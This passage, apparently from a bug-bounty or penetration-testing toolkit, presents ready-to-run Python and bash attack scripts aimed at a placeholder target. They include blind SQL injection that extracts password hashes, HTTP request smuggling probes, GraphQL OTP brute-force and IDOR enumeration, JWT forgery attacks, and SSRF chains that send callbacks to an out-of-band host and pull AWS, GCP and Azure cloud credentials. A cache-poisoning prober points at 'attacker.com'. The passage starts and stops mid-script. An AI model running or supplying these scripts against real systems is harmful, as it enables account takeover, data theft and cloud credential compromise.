            print(f"  [*] OOB payload sent → check http://{OOB_HOST} for callbacks")

main()
```

**16. SQLi Boolean Blind Bit-Extractor:**
```python
# tools/sqli_blind_extractor.py
# Extracts data character-by-character using boolean blind SQLi.
# Uses binary search (7 requests per char) instead of linear (95 requests per char).
# Works with any DB where you can inject a boolean predicate.
#
# HOW IT WORKS:
# 1. Confirm boolean oracle works (true_len != false_len)
# 2. Extract string length
# 3. Extract each character via binary search on ASCII range [32..127]
# 4. Saves extracted data to output/sqli_extracted.txt

import requests, time
from pathlib import Path

# ── CONFIG ──────────────────────────────────────────────────────────────────
TARGET_URL     = "https://target.com/items"
PARAM          = "id"
SESSION_COOKIE = "session=VALUE"
BASE_VALUE     = "1"           # Baseline value that returns normal response

# Payload template — {expr} is replaced with the boolean expression
# Adapt for your DB:
#   MySQL:      AND ({expr})-- -
#   PostgreSQL: AND ({expr})--
#   MSSQL:      AND ({expr})--
PAYLOAD_TPL    = "{base} AND ({expr})-- -"

# What to extract — adapt the SQL expression:
#   Current DB:     SELECT database()
#   Current user:   SELECT user()
#   Table name:     SELECT table_name FROM information_schema.tables LIMIT 1
#   Password hash:  SELECT password FROM users WHERE username='admin' LIMIT 1
EXTRACT_EXPR   = "SELECT database()"
MAX_LENGTH     = 64           # Max expected string length
# ────────────────────────────────────────────────────────────────────────────

HEADERS = {"Cookie": SESSION_COOKIE}

def send(expr: str) -> int:
    payload = PAYLOAD_TPL.format(base=BASE_VALUE, expr=expr)
    try:
        r = requests.get(TARGET_URL, params={PARAM: payload},
                         headers=HEADERS, timeout=8, verify=False)
        return len(r.text)
    except Exception:
        return -1

def verify_oracle() -> tuple[int, int]:
    true_len  = send("1=1")
    false_len = send("1=2")
    return true_len, false_len

def is_true(expr: str, true_len: int) -> bool:
    return send(expr) == true_len

def extract_length(true_len: int) -> int:
    for length in range(1, MAX_LENGTH + 1):
        if is_true(f"LENGTH(({EXTRACT_EXPR}))={length}", true_len):
            return length
    return 0

def extract_char(pos: int, true_len: int) -> str:
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if is_true(f"ASCII(SUBSTRING(({EXTRACT_EXPR}),{pos},1))>{mid}", true_len):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if 32 <= lo <= 127 else "?"

def main():
    print("[*] Verifying boolean oracle...")
    true_len, false_len = verify_oracle()
    print(f"    TRUE response length:  {true_len}")
    print(f"    FALSE response length: {false_len}")

    if true_len == false_len or true_len == -1:
        print("[-] Oracle not confirmed — responses are identical. Check your payload template.")
        return
    print("[+] Oracle confirmed!")

    print(f"\n[*] Extracting length of: {EXTRACT_EXPR}")
    length = extract_length(true_len)
    print(f"    Length = {length}")

    if length == 0:
        print("[-] Could not determine length — try increasing MAX_LENGTH")
        return

    print(f"\n[*] Extracting {length} characters (binary search ~7 req/char = ~{length*7} requests)...")
    result = ""
    for pos in range(1, length + 1):
        char = extract_char(pos, true_len)
        result += char
        print(f"  pos {pos:02d}/{length}: {char!r} → so far: {result!r}")

    print(f"\n[!!!] EXTRACTED: {result}")
    Path("output/sqli_extracted.txt").write_text(f"Query: {EXTRACT_EXPR}\nResult: {result}\n")

main()
```

**17. HTTP Request Smuggling Prober (CL.TE & TE.CL):**
```python
# tools/smuggling_prober.py
# Detects HTTP Request Smuggling via timing and differential response oracles.
# Tests both CL.TE and TE.CL variants.
#
# HOW IT WORKS:
# CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding.
#   → Send a request whose CL body hides a partial second request.
#   → If back-end processes TE, it leaves the leftover bytes as the start
#     of the NEXT request → next response reveals the poisoned prefix.
# TE.CL: Opposite — front-end uses TE, back-end uses CL.
#
# INDICATORS:
# - Timing: delayed response (back-end waits for rest of incomplete TE body)
# - Differential: next request returns unexpected response (poisoned)
#
# Requires: pip install requests --break-system-packages
# Use RAW sockets to send ambiguous headers (requests sanitizes them).

import socket, ssl, time

# ── CONFIG ──────────────────────────────────────────────────────────────────
HOST           = "target.com"
PORT           = 443
USE_TLS        = True
PATH           = "/"
SESSION_COOKIE = "session=VALUE"
TIMING_THRESH  = 5.0   # seconds; CL.TE causes back-end to hang waiting for body
# ────────────────────────────────────────────────────────────────────────────

def raw_send(data: bytes) -> tuple[float, bytes]:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMING_THRESH + 3)
    if USE_TLS:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=HOST)
    sock.connect((HOST, PORT))
    sock.sendall(data)
    start = time.perf_counter()
    resp = b""
    try:
        while chunk := sock.recv(4096):
            resp += chunk
    except Exception:
        pass
    elapsed = time.perf_counter() - start
    sock.close()
    return elapsed, resp

def build_clte_probe() -> bytes:
    # Front-end sees CL=6 (body = "0\r\n\r\n" → 5 bytes + 1 trailing G → 6)
    # Back-end sees TE chunked: chunk size 0 = end, then "G" left over as prefix of next req
    body = b"0\r\n\r\nG"
    req = (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Cookie: {SESSION_COOKIE}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
    ).encode() + body
    return req

def build_tecl_probe() -> bytes:
    # Front-end sees TE chunked (processes correctly); back-end uses CL.
    # Body chunk: "0\r\n\r\n" = zero-length chunk (terminates TE stream)
    # But CL says 6 → back-end waits for 6 bytes → hangs
    body = b"0\r\n\r\n"
    req = (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Cookie: {SESSION_COOKIE}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
    ).encode() + body
    return req

def main():
    print(f"[*] Testing HTTP Request Smuggling against {HOST}:{PORT}")

    # CL.TE
    print("\n[*] Probe 1: CL.TE ...")
    clte = build_clte_probe()
    elapsed, resp = raw_send(clte)
    print(f"    Response time: {elapsed:.2f}s")
    if elapsed >= TIMING_THRESH:
        print("  [!!!] TIMING ANOMALY — back-end may be using TE (CL.TE CANDIDATE)")
    else:
        print("  [-] CL.TE: No timing signal")

    # TE.CL
    print("\n[*] Probe 2: TE.CL ...")
    tecl = build_tecl_probe()
    elapsed2, resp2 = raw_send(tecl)
    print(f"    Response time: {elapsed2:.2f}s")
    if elapsed2 >= TIMING_THRESH:
        print("  [!!!] TIMING ANOMALY — back-end may be using CL (TE.CL CANDIDATE)")
    else:
        print("  [-] TE.CL: No timing signal")

    print("\n[!] If any timing anomaly: use smuggler.py for deeper confirmation.")
    print("    Next step: smuggler.py -u https://target.com --log-level DEBUG")

main()
```

**18. GraphQL Batching — Rate-Limit Bypass & IDOR via Aliases:**
```python
# tools/graphql_batch_attack.py
# Two attacks in one:
# A) Alias batching: send N mutations in ONE HTTP request → bypasses per-request rate limits.
#    Use for: OTP brute-force, password spray, coupon bulk redemption.
# B) IDOR via aliases: query N object IDs in one request → enumerate objects across users.

import requests, json

# ── CONFIG ──────────────────────────────────────────────────────────────────
GQL_URL        = "https://target.com/graphql"
SESSION_COOKIE = "session=YOUR_COOKIE"
# ────────────────────────────────────────────────────────────────────────────

HEADERS = {
    "Content-Type": "application/json",
    "Cookie": SESSION_COOKIE,
}

# ── ATTACK A: OTP Brute-Force via Alias Batching ────────────────────────────
def otp_bruteforce(otp_mutation: str, otp_range=range(0, 200)):
    """
    otp_mutation example:
      'verifyOtp(code: "{otp}", userId: "me") { success token }'
    Replace {otp} placeholder — we'll format it for each guess.
    """
    aliases = "\n".join(
        f'  try_{otp}: {otp_mutation.format(otp=str(otp).zfill(6))}'
        for otp in otp_range
    )
    query = f"mutation BatchOTP {{\n{aliases}\n}}"
    r = requests.post(GQL_URL, headers=HEADERS,
                      json={"query": query}, timeout=30, verify=False)
    data = r.json().get("data", {})
    for key, val in data.items():
        if val and val.get("success"):
            otp_val = key.replace("try_", "")
            print(f"  [!!!] OTP FOUND: {otp_val} → {val}")
            return otp_val
    print(f"  [-] No match in range {list(otp_range)[0]}–{list(otp_range)[-1]}")
    return None

# ── ATTACK B: IDOR via Alias Batching (Enumerate Object IDs) ────────────────
def idor_enum(object_query: str, id_range=range(1000, 1020)):
    """
    object_query example:
      'user(id: {id}) { id email role createdAt }'
    Replace {id} placeholder.
    """
    aliases = "\n".join(
        f'  obj_{oid}: {object_query.format(id=oid)}'
        for oid in id_range
    )
    query = f"query BatchIDOR {{\n{aliases}\n}}"
    r = requests.post(GQL_URL, headers=HEADERS,
                      json={"query": query}, timeout=30, verify=False)
    data = r.json().get("data", {})
    found = []
    for key, val in data.items():
        if val is not None:
            oid = key.replace("obj_", "")
            print(f"  [+] id={oid}: {json.dumps(val)[:150]}")
            found.append({"id": oid, "data": val})
    print(f"\n[*] {len(found)}/{len(list(id_range))} objects returned data")
    return found

if __name__ == "__main__":
    print("=== ATTACK A: OTP Brute-Force (first 200 codes) ===")
    # Adapt mutation to your schema:
    otp_bruteforce(
        otp_mutation='verifyOtp(code: "{otp}", phone: "+1234567890") {{ success token }}',
        otp_range=range(0, 200)
    )

    print("\n=== ATTACK B: IDOR via Alias Batching ===")
    idor_enum(
        object_query='user(id: {id}) {{ id email role plan }}',
        id_range=range(1000, 1020)
    )
```

**19. JWT Complete Attack Suite:**
```python
# tools/jwt_attack_suite.py
# Covers all major JWT attacks in sequence:
#   A) alg:none — strip signature entirely
#   B) RS256→HS256 algorithm confusion (public key as HMAC secret)
#   C) kid SQL injection / path traversal
#   D) Weak secret brute-force (offline wordlist)
#   E) JWKS substitution (inject our own key via jku/x5u)
#
# Requires: pip install pyjwt cryptography requests --break-system-packages

import base64, json, hmac, hashlib, requests
from pathlib import Path

# ── CONFIG ──────────────────────────────────────────────────────────────────
TARGET_URL     = "https://target.com/api/admin"
ORIGINAL_TOKEN = "eyJ..."   # Your valid JWT
JWKS_URL       = "https://target.com/.well-known/jwks.json"
WORDLIST       = "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
# ────────────────────────────────────────────────────────────────────────────

def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def parse_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]

def test_token(token: str, label: str):
    r = requests.get(TARGET_URL,
                     headers={"Authorization": f"Bearer {token}"},
                     verify=False, timeout=6)
    status = "[!!!] SUCCESS" if r.status_code not in (401, 403) else "[-] Rejected"
    print(f"  {status} [{label}] → {r.status_code} {len(r.text)}b")
    if r.status_code not in (401, 403):
        print(f"    Body: {r.text[:200]}")

def attack_none(header: dict, payload: dict) -> str:
    h = {**header, "alg": "none"}
    t = f"{b64url_encode(json.dumps(h).encode())}.{b64url_encode(json.dumps(payload).encode())}."
    return t

def attack_hs256_pubkey(header: dict, payload: dict, pubkey: str) -> str:
    import jwt as pyjwt
    h = {**header, "alg": "HS256"}
    # Remove 'alg' from additional_headers to avoid conflict
    return pyjwt.encode(payload, pubkey, algorithm="HS256",
                        headers={"kid": h.get("kid")})

def attack_kid_sqli(header: dict, payload: dict) -> list[str]:
    # kid injection: make DB return a known secret (e.g. empty string via NULL)
    sqli_kids = [
        "' UNION SELECT 'secret'-- -",
        "../../dev/null",               # Path traversal → empty file → empty secret
        "/dev/null",
    ]
    tokens = []
    import jwt as pyjwt
    for kid in sqli_kids:
        h = {**header, "alg": "HS256", "kid": kid}
        # Sign with empty secret (path traversal to /dev/null gives b"")
        sig = b64url_encode(
            hmac.new(b"", f"{b64url_encode(json.dumps(h).encode())}.{b64url_encode(json.dumps(payload).encode())}".encode(), hashlib.sha256).digest()
        )
        t = f"{b64url_encode(json.dumps(h).encode())}.{b64url_encode(json.dumps(payload).encode())}.{sig}"
        tokens.append((kid, t))
    return tokens

def attack_brute_secret(token: str) -> str | None:
    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    sig = b64url_decode(parts[2])
    wl = Path(WORDLIST)
    if not wl.exists():
        print(f"  [!] Wordlist not found: {WORDLIST}")
        return None
    for line in wl.read_text(errors="ignore").splitlines():
        secret = line.strip().encode()
        expected = hmac.new(secret, signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(expected, sig):
            print(f"  [!!!] WEAK SECRET FOUND: {line.strip()!r}")
            return line.strip()
    return None

def main():
    header, payload, sig = parse_jwt(ORIGINAL_TOKEN)
    print(f"[*] Original JWT header: {header}")
    print(f"[*] Original payload:    {payload}")

    # Elevate payload claims
    evil_payload = {**payload, "role": "admin", "isAdmin": True, "sub": "admin"}

    print("\n[A] alg:none attack")
    test_token(attack_none(header, evil_payload), "alg:none")

    print("\n[B] RS256→HS256 (public key as HMAC secret)")
    try:
        pub = requests.get(JWKS_URL, verify=False, timeout=5).text
        test_token(attack_hs256_pubkey(header, evil_payload, pub), "RS256→HS256")
    except Exception as e:
        print(f"  [!] Could not fetch JWKS: {e}")

    print("\n[C] kid injection (SQL / path traversal)")
    for kid_val, token in attack_kid_sqli(header, evil_payload):
        test_token(token, f"kid={kid_val!r}")

    print(f"\n[D] Weak secret brute-force ({WORDLIST})")
    secret = attack_brute_secret(ORIGINAL_TOKEN)
    if secret:
        import jwt as pyjwt
        forged = pyjwt.encode(evil_payload, secret, algorithm=header.get("alg", "HS256"))
        test_token(forged, f"brute secret={secret!r}")

main()
```

---

## Bash One-Liners (Extended)

**CloudFlare Origin IP Discovery (Cert Transparency + Historical DNS):**
```bash
# Find real origin IP behind Cloudflare using cert transparency and old DNS records
domain="target.com"
# 1. Cert transparency — find direct IPs/subdomains that may bypass CF
curl -s "https://crt.sh/?q=%25.${domain}&output=json" | jq -r '.[].name_value' \
  | sort -u | grep -v '\*' > output/ct_subdomains.txt

# 2. SecurityTrails historical DNS (needs API key or use web_search)
curl -s "https://securitytrails.com/domain/${domain}/history/a" \
  | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > output/historical_ips.txt

# 3. Test if any IP responds directly to the domain
while read ip; do
  result=$(curl -sk -m 5 -o /dev/null -w "%{http_code}" \
    -H "Host: ${domain}" "https://${ip}/")
  [ "$result" != "000" ] && echo "[+] Origin candidate: $ip → $result"
done < output/historical_ips.txt
```

**Prototype Pollution in JS Bundles — Static Scan:**
```bash
# Scan all downloaded JS files for prototype pollution sinks
# Download first: cat output/urls_all_deduped.txt | grep "\.js$" | parallel -j 20 "curl -sk {} -o output/js_files/{#}.js"
find output/js_files/ -name "*.js" | xargs -P 10 -I{} sh -c '
  rg -l "__proto__|constructor\[.prototype.\]|Object\.assign\(.*prototype|merge\(.*\{" {} && echo "  → {}"
' 2>/dev/null | tee output/proto_pollution_candidates.txt

# Then js-beautify + eslint on flagged files:
# js-beautify output/js_files/flagged.js | eslint --stdin --rule '{"no-proto":["error"]}'
```

**Mass Endpoint Auth Differential (Find Broken Access Control):**
```bash
# Compare responses between authenticated and unauthenticated requests
# If both return 200 with same body length → likely public (false positive)
# If auth=200 and unauth=200 with SAME content → broken access control
AUTH_COOKIE="session=YOUR_SESSION"
cat output/urls_all_deduped.txt | grep -v "\.js\|\.css\|\.png\|\.jpg" | head -200 | \
while read url; do
  auth_len=$(curl -sk -m 5 -o /dev/null -w "%{size_download}" -H "Cookie: $AUTH_COOKIE" "$url")
  unauth_len=$(curl -sk -m 5 -o /dev/null -w "%{size_download}" "$url")
  auth_status=$(curl -sk -m 5 -o /dev/null -w "%{http_code}" -H "Cookie: $AUTH_COOKIE" "$url")
  unauth_status=$(curl -sk -m 5 -o /dev/null -w "%{http_code}" "$url")

  # Flag: auth=200, unauth=200, similar body size (within 50 bytes)
  if [ "$auth_status" = "200" ] && [ "$unauth_status" = "200" ]; then
    diff=$(( auth_len - unauth_len ))
    diff=${diff#-}  # absolute value
    if [ "$diff" -lt 50 ]; then
      echo "[!!!] BROKEN AC: $url (auth=${auth_len}b unauth=${unauth_len}b diff=${diff}b)"
    fi
  fi
  # Flag: unauth=200 but endpoint looks private (/admin /api/user /internal)
  echo "$url" | grep -qiE "admin|internal|user|account|profile|manage|setting|dashboard" && \
    [ "$unauth_status" = "200" ] && \
    echo "[?] PRIVATE ENDPOINT UNPROTECTED: $url (unauth=$unauth_status len=${unauth_len}b)"
done | tee output/broken_access_candidates.txt

---

## SSRF Scripts

**20. Blind SSRF — Interactsh OOB Full Chain:**
```python
# tools/ssrf_blind.py
# Comprehensive blind SSRF prober using interactsh for OOB callbacks.
# Tests: URL params, headers, JSON body fields, file upload metadata, redirect chains.
#
# HOW IT WORKS:
# 1. Start interactsh-client in background (or use existing session)
# 2. Inject OOB URL into every parameter and header variant
# 3. Monitor interactsh for DNS/HTTP callbacks — each callback = confirmed SSRF
# 4. Maps which injection point triggered the callback
#
# SETUP: Run FIRST in separate terminal:
#   interactsh-client -server oast.pro -o output/oob_callbacks.txt
#   Note the generated subdomain (e.g. abc123.oast.pro)
#
# Requires: pip install httpx --break-system-packages

import asyncio, httpx, json, time
from pathlib import Path

# ── CONFIG ──────────────────────────────────────────────────────────────────
TARGET_BASE    = "https://target.com"
SESSION_COOKIE = "session=YOUR_COOKIE"
OOB_HOST       = "abc123.oast.pro"    # From interactsh-client output
OUTPUT_FILE    = "output/ssrf_probes.txt"

# Endpoints to test — found from JS recon / manual mapping
ENDPOINTS = [
    # (method, path, param_type, param_name)
    ("GET",  "/api/fetch?url=",        "url_param",  "url"),
    ("GET",  "/api/preview?link=",     "url_param",  "link"),
    ("POST", "/api/webhook",           "json_body",  "callback_url"),
    ("POST", "/api/export",            "json_body",  "destination"),
    ("GET",  "/api/image?src=",        "url_param",  "src"),
    ("POST", "/api/import",            "json_body",  "remote_url"),
]
# ────────────────────────────────────────────────────────────────────────────

HEADERS_BASE = {
    "Cookie": SESSION_COOKIE,
    "Content-Type": "application/json",
}

# OOB URL variants — different protocols and encodings
def oob_variants(tag: str) -> list[str]:
    h = f"{tag}.{OOB_HOST}"
    return [
        f"http://{h}/",
        f"https://{h}/",
        f"http://{h}:80/",
        f"http://{h}:8080/",
        # Protocol bypass
        f"//\x09{h}/",
        f"http://{h}@127.0.0.1/",
        # Cloud metadata via SSRF chain
        f"http://169.254.169.254/latest/meta-data/?x={h}",
    ]

# Header injection — these headers often trigger server-side requests
SSRF_HEADERS = [
    "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
    "X-Remote-IP", "X-Remote-Addr", "X-Cluster-Client-IP",
    "X-Forwarded-Host", "X-Host", "X-Custom-IP-Authorization",
    "Referer", "Origin", "True-Client-IP",
    "CF-Connecting-IP", "Fastly-Client-IP",
]

async def probe(client: httpx.AsyncClient, tag: str, method: str,
                url: str, param_type: str, oob_url: str) -> dict:
    try:
        if param_type == "url_param":
            r = await client.request(method, url + oob_url,
                                     headers=HEADERS_BASE, timeout=8.0)
        elif param_type == "json_body":
            body = json.dumps({"url": oob_url, "callback_url": oob_url,
                               "webhook": oob_url, "destination": oob_url})
            r = await client.request(method, url, content=body,
                                     headers=HEADERS_BASE, timeout=8.0)
        else:
            r = await client.request(method, url, headers=HEADERS_BASE, timeout=8.0)
        return {"tag": tag, "url": url, "status": r.status_code, "oob": oob_url}
    except Exception as e:
        return {"tag": tag, "url": url, "status": -1, "error": str(e)[:80]}

async def probe_headers(client: httpx.AsyncClient, tag: str) -> list[dict]:
    results = []
    test_url = f"{TARGET_BASE}/"
    for header in SSRF_HEADERS:
        oob_url = f"http://{tag}-hdr-{header.lower().replace('-','')}.{OOB_HOST}/"
        headers = {**HEADERS_BASE, header: oob_url}
        try:
            r = await client.get(test_url, headers=headers, timeout=6.0)
            results.append({"tag": tag, "vector": f"header:{header}",
                            "status": r.status_code})
        except Exception:
            pass
    return results

async def main():
    print(f"[*] Blind SSRF probe → callbacks will appear at *.{OOB_HOST}")
    print(f"[*] Monitor: tail -f {OUTPUT_FILE} & watch interactsh output\n")

    all_results = []
    async with httpx.AsyncClient(verify=False, follow_redirects=False) as client:
        # 1. Endpoint parameter probes
        tasks = []
        for i, (method, path, ptype, pname) in enumerate(ENDPOINTS):
            url = TARGET_BASE + path
            for j, oob_url in enumerate(oob_variants(f"ep{i}v{j}")):
                tag = f"ep{i}-{pname}-v{j}"
                tasks.append(probe(client, tag, method, url, ptype, oob_url))

        print(f"[*] Firing {len(tasks)} endpoint probes...")
        ep_results = await asyncio.gather(*tasks, return_exceptions=True)
        all_results.extend([r for r in ep_results if isinstance(r, dict)])

        # 2. Header injection probes
        print(f"[*] Firing {len(SSRF_HEADERS)} header injection probes...")
        hdr_tag = f"hdr0"
        hdr_results = await probe_headers(client, hdr_tag)
        all_results.extend(hdr_results)

    # Save all probes
    lines = [f"{r}\n" for r in all_results]
    Path(OUTPUT_FILE).write_text("".join(lines))
    print(f"\n[*] {len(all_results)} probes sent → {OUTPUT_FILE}")
    print(f"[!!!] NOW CHECK interactsh output for DNS/HTTP callbacks!")
    print(f"      Each callback subdomain maps to a specific injection point.")
    print(f"      Callback from 'ep0v0.{OOB_HOST}' = ENDPOINTS[0] + oob_variants[0]")

asyncio.run(main())
```

**21. SSRF → AWS/GCP/Azure Credential Chain:**
```python
# tools/ssrf_cloud_chain.py
# Full SSRF exploitation chain: confirm SSRF → extract cloud credentials.
# Run AFTER confirming SSRF exists at a specific endpoint.
#
# HOW IT WORKS:
# 1. Probe known cloud metadata endpoints via the confirmed SSRF
# 2. Extract IAM role name → fetch temporary credentials
# 3. Save credentials for further testing (S3 access, API calls)
#
# Usage: Set SSRF_URL to the confirmed vulnerable endpoint + parameter.
# The {TARGET} placeholder will be replaced with each metadata URL.

import requests, json, re

# ── CONFIG ──────────────────────────────────────────────────────────────────
# Example: "https://target.com/api/fetch?url={TARGET}"
# The {TARGET} placeholder is replaced with each metadata URL
SSRF_URL       = "https://target.com/api/fetch?url={TARGET}"
SESSION_COOKIE = "session=YOUR_COOKIE"
OUTPUT_FILE    = "output/ssrf_credentials.json"
# ────────────────────────────────────────────────────────────────────────────

HEADERS = {"Cookie": SESSION_COOKIE}

def ssrf_fetch(path: str) -> str:
    """Fetch a URL through the SSRF endpoint."""
    url = SSRF_URL.format(TARGET=requests.utils.quote(path, safe=":/?&="))
    try:
        r = requests.get(url, headers=HEADERS, timeout=8, verify=False)
        return r.text
    except Exception as e:
        return f"ERROR: {e}"

# ── AWS Metadata ─────────────────────────────────────────────────────────────
def chain_aws() -> dict | None:
    print("\n[AWS] Testing IMDSv1 (no token required)...")
    base = "http://169.254.169.254"

    # IMDSv2 token (optional — try IMDSv1 first)
    meta = ssrf_fetch(f"{base}/latest/meta-data/")
    if "ERROR" in meta or len(meta) < 10:
        # Try IPv6, decimal, hex forms
        for bypass in ["http://[::ffff:169.254.169.254]", "http://0xa9fea9fe",
                       "http://2852039166", "http://169.254.169.254/"]:
            meta = ssrf_fetch(f"{bypass}/latest/meta-data/")
            if len(meta) > 10:
                base = bypass
                break
    if len(meta) < 10:
        print("  [-] AWS metadata not reachable")
        return None

    print(f"  [+] Metadata accessible! Contents: {meta[:100]}")

    # Get IAM role
    role = ssrf_fetch(f"{base}/latest/meta-data/iam/security-credentials/").strip()
    if not role:
        print("  [-] No IAM role attached to this instance")
        return {"platform": "aws", "instance_metadata": meta[:500]}

    print(f"  [+] IAM Role: {role}")
    creds_raw = ssrf_fetch(f"{base}/latest/meta-data/iam/security-credentials/{role}")
    try:
        creds = json.loads(creds_raw)
        print(f"  [!!!] CREDENTIALS EXTRACTED:")
        print(f"        AccessKeyId:     {creds.get('AccessKeyId', 'N/A')}")
        print(f"        SecretAccessKey: {creds.get('SecretAccessKey', 'N/A')[:8]}...")
        print(f"        Token:           {creds.get('Token', 'N/A')[:20]}...")
        print(f"        Expiration:      {creds.get('Expiration', 'N/A')}")
        return {"platform": "aws", "role": role, "credentials": creds}
    except Exception:
        return {"platform": "aws", "role": role, "raw": creds_raw[:500]}

# ── GCP Metadata ─────────────────────────────────────────────────────────────
def chain_gcp() -> dict | None:
    print("\n[GCP] Testing metadata.google.internal...")
    headers_ext = {**HEADERS, "Metadata-Flavor": "Google"}

    # GCP requires Metadata-Flavor header — inject it via request headers
    # (This works if the SSRF endpoint forwards custom headers)
    base = "http://metadata.google.internal/computeMetadata/v1"
    token_raw = ssrf_fetch(f"{base}/instance/service-accounts/default/token")
    if "access_token" in token_raw:
        token = json.loads(token_raw)
        print(f"  [!!!] GCP Access Token: {token.get('access_token', '')[:30]}...")
        email = ssrf_fetch(f"{base}/instance/service-accounts/default/email").strip()
        scopes = ssrf_fetch(f"{base}/instance/service-accounts/default/scopes")
        return {"platform": "gcp", "email": email,
                "access_token": token.get("access_token"), "scopes": scopes[:200]}
    elif "ERROR" not in token_raw and len(token_raw) > 5:
        return {"platform": "gcp", "raw": token_raw[:300]}
    return None

# ── Azure Metadata ────────────────────────────────────────────────────────────
def chain_azure() -> dict | None:
    print("\n[Azure] Testing 169.254.169.254 IMDS...")
    # Azure IMDS requires: api-version param and Metadata:true header
    url = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    raw = ssrf_fetch(url)
    if '"compute"' in raw and '"subscriptionId"' in raw:
        try:
            data = json.loads(raw)
            sub_id = data.get("compute", {}).get("subscriptionId", "N/A")
            print(f"  [+] Azure subscription: {sub_id}")
            # Get managed identity token
            token_url = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
            token_raw = ssrf_fetch(token_url)
            if "access_token" in token_raw:
                token = json.loads(token_raw)
                print(f"  [!!!] Azure Managed Identity Token: {token.get('access_token','')[:30]}...")
                return {"platform": "azure", "subscription": sub_id, "token": token}
            return {"platform": "azure", "instance": data}
        except Exception:
            return {"platform": "azure", "raw": raw[:400]}
    return None

def main():
    print(f"[*] SSRF Cloud Credential Chain")
    print(f"[*] SSRF endpoint: {SSRF_URL}")
    print("[*] Testing all cloud platforms...\n")

    results = {}
    for fn, label in [(chain_aws, "AWS"), (chain_gcp, "GCP"), (chain_azure, "Azure")]:
        r = fn()
        if r:
            results[label] = r
            print(f"\n  [!!!] {label} credentials extracted!")

    if results:
        import json as _json
        Path_out = __import__("pathlib").Path(OUTPUT_FILE)
        Path_out.write_text(_json.dumps(results, indent=2))
        print(f"\n[*] Credentials saved to {OUTPUT_FILE}")
        print("[!!!] CRITICAL: Report immediately. Rotate credentials.")
    else:
        print("\n[-] No cloud credentials found via SSRF.")
        print("    Try: Kubernetes API (10.96.0.1:443), Redis (6379), internal HTTP services")

main()
```

---

## Cache Poisoning Scripts

**22. Web Cache Poisoning Prober:**
```python
# tools/cache_poison_prober.py
# Systematically tests for Web Cache Poisoning via unkeyed inputs.
# Tests: X-Forwarded-Host, X-Forwarded-Scheme, fat GET, Host header, unkeyed params.
#
# HOW IT WORKS:
# 1. Establish baseline response (no injection)
# 2. Inject canary value into each unkeyed header/param with cache-buster
# 3. Make second request WITHOUT injection — if canary appears, the cache was poisoned
# 4. For Host header injection: check if injected host appears in response (import URL, CSP, etc.)
#
# CRITICAL: ALWAYS use a unique cache-buster per test to avoid poisoning other users.

import requests, hashlib, time, json, re
from pathlib import Path

# ── CONFIG ──────────────────────────────────────────────────────────────────
TARGET_URL     = "https://target.com/"
SESSION_COOKIE = "session=YOUR_COOKIE"
CANARY         = "poisontest12345"   # Unique string — check if it appears in cached response
OOB_HOST       = "attacker.com"      # Controlled domain for Host header injection
OUTPUT_FILE    = "output/cache_poison_results.txt"
# ────────────────────────────────────────────────────────────────────────────

BASE_HEADERS = {"Cookie": SESSION_COOKIE}

def cache_buster() -> str:
    """Unique cache key param to isolate each test from real cache."""
    return f"cachebust={hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"

def add_buster(url: str) -> str:
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}{cache_buster()}"

def get(url: str, extra_headers: dict = {}) -> requests.Response:
    return requests.get(url, headers={**BASE_HEADERS, **extra_headers},
                        timeout=8, verify=False, allow_redirects=False)

def check_poison(test_name: str, inject_headers: dict, check_fn) -> dict | None:
    """
    inject_headers: headers to add on poisoning request
    check_fn: callable(response_text) → bool — returns True if poisoned
    Returns finding dict if poisoned, None otherwise.
    """
    buster_url = add_buster(TARGET_URL)

    # Step 1: Poison the cache
    r_poison = get(buster_url, inject_headers)
    if check_fn(r_poison.text):
        # Canary reflected in first response — might be injection, not poison
        pass

    # Step 2: Fetch same URL WITHOUT injection — check if cached response contains canary
    time.sleep(0.5)
    r_clean = get(buster_url)  # Same cache key — should return cached poisoned response
    if check_fn(r_clean.text):
        return {
            "test": test_name,
            "url": buster_url,
            "inject_headers": inject_headers,
            "poison_status": r_poison.status_code,
            "clean_status": r_clean.status_code,
            "evidence": re.findall(rf".{{0,40}}{re.escape(CANARY)}.{{0,40}}", r_clean.text)[:3],
        }
    return None

def main():
    print(f"[*] Web Cache Poisoning Prober → {TARGET_URL}")
    print(f"[*] Canary: {CANARY!r}")
    findings = []

    # ── Test 1: X-Forwarded-Host ──────────────────────────────────────────────
    print("\n[1] X-Forwarded-Host injection...")
    r = check_poison("X-Forwarded-Host",
                     {"X-Forwarded-Host": f"{CANARY}.{OOB_HOST}"},
                     lambda body: CANARY in body)
    if r: findings.append(r); print(f"  [!!!] POISONED: {r['evidence']}")
    else: print("  [-] Not vulnerable")

    # ── Test 2: X-Forwarded-Scheme ────────────────────────────────────────────
    print("\n[2] X-Forwarded-Scheme: http (downgrade)...")
